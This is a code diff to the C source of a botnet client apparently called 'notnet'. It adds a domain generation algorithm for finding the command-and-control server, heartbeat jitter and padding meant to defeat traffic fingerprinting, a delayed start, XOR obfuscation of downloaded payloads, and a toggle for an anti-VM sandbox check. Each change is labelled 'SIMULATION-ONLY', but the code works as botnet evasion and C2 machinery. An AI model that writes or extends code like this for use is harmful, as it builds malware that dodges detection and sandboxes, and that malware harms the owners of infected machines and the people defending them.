@@ -775,6 +775,73 @@ static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
     return diff == 0 ? 1 : 0;
 }
 
+/* ── DGA (#159, SIMULATION-ONLY) ─────────────────────────────── */
+/* FNV-1a 32-bit over an ASCII string. Chosen because it is tiny,
+ * dependency-free, and identical to implement in the C2 (see the
+ * algorithm contract + Python reference in include/config.h). */
+static uint32_t dga_fnv1a32(const char *s) {
+    uint32_t h = 2166136261u;
+    while (*s) {
+        h ^= (unsigned char)*s++;
+        h *= 16777619u;
+    }
+    return h;
+}
+
+/* Today's DGA domain for this bot: "<8 hex>.<dga_tld>", recomputed when
+ * the day rolls over (cached so each connect attempt does not redo the
+ * hash). Returns NULL when DGA is disabled (no dga_seed configured) —
+ * callers must treat that as "feature off", not an error. */
+const char *dga_current_domain(notnet_bot_t *bot) {
+    static char domain[DGA_DOMAIN_MAX];
+    static int cached_day = -1;
+    static char cached_seed[DGA_SEED_MAX_HEX + 1] = "";
+
+    if (bot == NULL || bot->dga_seed[0] == '\0') return NULL;
+
+    time_t now = time(NULL);
+    struct tm tm_now;
+    localtime_r(&now, &tm_now);
+    /* Year-weighted day index so the cache also invalidates at New Year */
+    int today = tm_now.tm_year * 366 + tm_now.tm_yday;
+
+    if (today != cached_day ||
+        strcmp(cached_seed, bot->dga_seed) != 0) {
+        char material[DGA_SEED_MAX_HEX + 16];
+        snprintf(material, sizeof(material), "%s:%04d-%03d",
+                 bot->dga_seed, (tm_now.tm_year + 1900) % 10000,
+                 (tm_now.tm_yday + 1) % 1000);
+        snprintf(domain, sizeof(domain), "%08x.%s",
+                 dga_fnv1a32(material),
+                 bot->dga_tld[0] != '\0' ? bot->dga_tld : DGA_TLD_DEFAULT);
+        snprintf(cached_seed, sizeof(cached_seed), "%s", bot->dga_seed);
+        cached_day = today;
+        log_info("DGA: today's candidate domain %s", domain);
+    }
+    return domain;
+}
+
+/* ISSUE #159: validate an ASCII hex string of length min..max chars.
+ * Returns 1 when valid, 0 otherwise (empty always invalid). */
+static int hex_str_valid(const char *s, size_t min_len, size_t max_len) {
+    size_t n = strlen(s);
+    if (n < min_len || n > max_len) return 0;
+    for (const char *p = s; *p; p++) {
+        if (!((*p >= '0' && *p <= '9') ||
+              (*p >= 'a' && *p <= 'f') ||
+              (*p >= 'A' && *p <= 'F'))) return 0;
+    }
+    return 1;
+}
+
+/* ISSUE #159: lowercase a hex string in place (normalization, matching
+ * how payload_sha256/tls_cert_pin_sha256 are normalized on load). */
+static void hex_str_lower(char *s) {
+    for (; *s; s++) {
+        if (*s >= 'A' && *s <= 'F') *s += ('a' - 'A');
+    }
+}
+
 int http_connect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) return 0;
     
@@ -803,9 +870,36 @@ int http_connect(notnet_bot_t *bot) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     
+    /* ISSUE #159 (SIMULATION-ONLY): DGA candidate resolution. When
+     * dga_seed= is configured AND we are dialing the primary endpoint,
+     * today's generated domain (<8hex>.<dga_tld>, algorithm documented
+     * in include/config.h) is tried FIRST as an ADDITIONAL resolution
+     * candidate; if it resolves its address is dialed with the
+     * endpoint's port. Failure falls through to the static server with
+     * behavior identical to stock. DNS pinning (#10) is skipped on a
+     * DGA dial by design — the DGA name fronts rotating infrastructure,
+     * not the pinned static hostname. Default (no dga_seed): untouched.
+     * NOTE: intentionally evaluated before the flux cache (#85) so the
+     * daily domain wins on primary dials when both are enabled. */
+    int dga_resolved = 0;
+    if (bot->dga_seed[0] != '\0' && bot->c2_rot_index == 0 &&
+        !bot->flux_enabled) {
+        const char *dd = dga_current_domain(bot);
+        if (dd != NULL) {
+            in_addr_t dip = (in_addr_t)protocol_resolve_host(dd);
+            if (dip != (in_addr_t)-1 && dip != 0) {
+                addr.sin_addr.s_addr = dip;
+                dga_resolved = 1;
+                log_info("HTTP: using DGA candidate %s", dd);
+            } else {
+                log_info("HTTP: DGA candidate %s did not resolve", dd);
+            }
+        }
+    }
+    
     /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
      * gethostbyname + memcpy (h_length overflow on IPv6 results). */
-    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
+    if (!dga_resolved && inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
         /* SECURITY FIX (#85): In flux mode use the rotating cache of
          * all A records; otherwise a single resolution as before. */
         if (bot->flux_enabled) {
@@ -829,8 +923,10 @@ int http_connect(notnet_bot_t *bot) {
      * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates.
      * SECURITY FIX (#93): also skipped when rotated off the primary —
      * a backup endpoint is a different host by design; the pin guards
-     * rebinding of the SAME hostname, not operator-configured failover. */
-    if (!bot->flux_enabled && bot->c2_rot_index == 0 &&
+     * rebinding of the SAME hostname, not operator-configured failover.
+     * ISSUE #159: also skipped on a DGA dial — different name, rotating
+     * infrastructure by design (SIMULATION-ONLY, dga_seed configured). */
+    if (!dga_resolved && !bot->flux_enabled && bot->c2_rot_index == 0 &&
         bot->c2_http.dns_pinned &&
         addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
         log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
@@ -3254,6 +3350,72 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
                 bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
                 applied = 1;
+            } else if (strcmp(key, "heartbeat_jitter") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): heartbeat jitter
+                 * percent, 0..50 (0 = exact interval, default). */
+                int v = atoi(value);
+                if (v >= 0 && v <= HEARTBEAT_JITTER_MAX_PCT) {
+                    bot->heartbeat_jitter_pct = (uint32_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "start_delay_s") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): sleep-on-start,
+                 * 0..3600 (0 = no delay, default). Takes effect on
+                 * next process start; runtime set only records it. */
+                long v = atol(value);
+                if (v >= 0 && v <= START_DELAY_MAX_S) {
+                    bot->start_delay_s = (uint32_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "dga_seed") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): DGA seed, 1..64 hex
+                 * chars. Empty string cannot be expressed via
+                 * config_set (sscanf %255s), so DGA disable is a
+                 * config-file-only operation. */
+                if (hex_str_valid(value, 1, DGA_SEED_MAX_HEX)) {
+                    hex_str_lower(value);
+                    strncpy(bot->dga_seed, value, DGA_SEED_MAX_HEX);
+                    bot->dga_seed[DGA_SEED_MAX_HEX] = '\0';
+                    applied = 1;
+                }
+            } else if (strcmp(key, "dga_tld") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): DGA TLD, bounded. */
+                strncpy(bot->dga_tld, value, sizeof(bot->dga_tld) - 1);
+                bot->dga_tld[sizeof(bot->dga_tld) - 1] = '\0';
+                applied = 1;
+            } else if (strcmp(key, "payload_key_hex") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): payload XOR
+                 * obfuscation key — exactly 64 hex chars (32 bytes).
+                 * OBFUSCATION-GRADE, not encryption (no crypto lib in
+                 * the bot; honest labeling). Applies to the next
+                 * payload download. */
+                if (hex_str_valid(value, PAYLOAD_XOR_KEY_HEX_LEN,
+                                  PAYLOAD_XOR_KEY_HEX_LEN)) {
+                    hex_str_lower(value);
+                    strncpy(bot->payload_key_hex, value,
+                            PAYLOAD_XOR_KEY_HEX_LEN);
+                    bot->payload_key_hex[PAYLOAD_XOR_KEY_HEX_LEN] = '\0';
+                    applied = 1;
+                }
+            } else if (strcmp(key, "anti_vm") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): strict 0/1 toggle for
+                 * the pre-main-loop sandbox sweep. The sweep itself
+                 * runs at boot; a runtime 1 takes effect on next
+                 * start. */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->anti_vm = (uint8_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "hb_pad_max") == 0) {
+                /* ISSUE #159 (SIMULATION-ONLY): max random heartbeat
+                 * pad bytes, 0..512 (0 = no pad field, default).
+                 * Takes effect on the next heartbeat. */
+                int v = atoi(value);
+                if (v >= 0 && v <= HB_PAD_MAX_BYTES) {
+                    bot->hb_pad_max = (uint32_t)v;
+                    applied = 1;
+                }
             }
             
             if (applied) {
@@ -3728,6 +3890,31 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
         relay_is_running() ? 1 : 0, relay_get_port(), safe_tag);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
+    }
+
+    /* ISSUE #159 (SIMULATION-ONLY): traffic shaping. When hb_pad_max=
+     * is set (0..512 bytes, default 0), append a random-length "pad"
+     * JSON field of random alphanumerics (getrandom-backed
+     * random_string) so heartbeat size does not fingerprint the
+     * protocol. Default 0: no pad field, wire format unchanged. */
+    if (bot->hb_pad_max > 0) {
+        uint32_t span = bot->hb_pad_max;
+        if (span > HB_PAD_MAX_BYTES) span = HB_PAD_MAX_BYTES;
+        size_t len = strlen(heartbeat);
+        if (len > 0 && heartbeat[len - 1] == '}') {
+            /* Room for ,"pad":"<n>" plus NUL and slack */
+            size_t room = sizeof(heartbeat) - len - 24;
+            uint32_t n = random_uint32() % (span + 1);
+            if ((size_t)n > room) n = (uint32_t)room;
+            if (n > 0) {
+                char pad[HB_PAD_MAX_BYTES + 1];
+                random_string(pad, (int)n + 1);  /* writes n chars + NUL */
+                heartbeat[len - 1] = '\0';       /* drop closing brace */
+                snprintf(heartbeat + strlen(heartbeat),
+                         sizeof(heartbeat) - strlen(heartbeat),
+                         ",\"pad\":\"%s\"}", pad);
+            }
+        }
     }
     
     /* Send via IRC */
@@ -4572,6 +4759,73 @@ int load_config(notnet_bot_t *bot, const char *path) {
              * attribute bots to affiliates. */
             strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
             bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
+        } else if (strcmp(key, "heartbeat_jitter") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): heartbeat jitter percent,
+             * clamped 0..50 like config_set enforces. 0 = exact
+             * interval (default, unchanged behavior). */
+            int v = atoi(value);
+            if (v >= 0 && v <= HEARTBEAT_JITTER_MAX_PCT) {
+                bot->heartbeat_jitter_pct = (uint32_t)v;
+            } else {
+                log_warn("Config: heartbeat_jitter=%d out of range (0-%d), keeping %u",
+                         v, HEARTBEAT_JITTER_MAX_PCT, bot->heartbeat_jitter_pct);
+            }
+        } else if (strcmp(key, "start_delay_s") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): sleep-on-start seconds,
+             * clamped 0..3600. 0 = no delay (default). */
+            long v = atol(value);
+            if (v >= 0 && v <= START_DELAY_MAX_S) {
+                bot->start_delay_s = (uint32_t)v;
+            } else {
+                log_warn("Config: start_delay_s=%ld out of range (0-%d), keeping %u",
+                         v, START_DELAY_MAX_S, bot->start_delay_s);
+            }
+        } else if (strcmp(key, "dga_seed") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): DGA seed — 1..64 hex chars;
+             * empty/absent disables DGA entirely (the default). */
+            if (hex_str_valid(value, 1, DGA_SEED_MAX_HEX)) {
+                hex_str_lower(value);
+                strncpy(bot->dga_seed, value, DGA_SEED_MAX_HEX);
+                bot->dga_seed[DGA_SEED_MAX_HEX] = '\0';
+                log_info("DGA enabled (seed configured)");
+            } else {
+                log_warn("Config: dga_seed rejected — use 1..%d hex chars",
+                         DGA_SEED_MAX_HEX);
+            }
+        } else if (strcmp(key, "dga_tld") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): DGA TLD. Default applied in
+             * init_bot when left unset. */
+            strncpy(bot->dga_tld, value, sizeof(bot->dga_tld) - 1);
+            bot->dga_tld[sizeof(bot->dga_tld) - 1] = '\0';
+        } else if (strcmp(key, "payload_key_hex") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): payload XOR obfuscation key.
+             * Exactly 64 hex chars; XOR-with-key-stream is OBFUSCATION-
+             * GRADE, not encryption (honest labeling — the bot has no
+             * crypto lib). Empty/absent keeps plaintext downloads. */
+            if (hex_str_valid(value, PAYLOAD_XOR_KEY_HEX_LEN,
+                              PAYLOAD_XOR_KEY_HEX_LEN)) {
+                hex_str_lower(value);
+                strncpy(bot->payload_key_hex, value, PAYLOAD_XOR_KEY_HEX_LEN);
+                bot->payload_key_hex[PAYLOAD_XOR_KEY_HEX_LEN] = '\0';
+                log_info("Payload XOR obfuscation key configured");
+            } else {
+                log_warn("Config: payload_key_hex rejected — need exactly "
+                         "%d hex chars", PAYLOAD_XOR_KEY_HEX_LEN);
+            }
+        } else if (strcmp(key, "anti_vm") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): pre-main-loop sandbox sweep
+             * toggle. Default 0 — no sweep runs. */
+            bot->anti_vm = (atoi(value) != 0);
+        } else if (strcmp(key, "hb_pad_max") == 0) {
+            /* ISSUE #159 (SIMULATION-ONLY): max random heartbeat pad
+             * bytes, clamped 0..512. 0 = no pad field (default). */
+            int v = atoi(value);
+            if (v >= 0 && v <= HB_PAD_MAX_BYTES) {
+                bot->hb_pad_max = (uint32_t)v;
+            } else {
+                log_warn("Config: hb_pad_max=%d out of range (0-%d), keeping %u",
+                         v, HB_PAD_MAX_BYTES, bot->hb_pad_max);
+            }
         }
     }
     
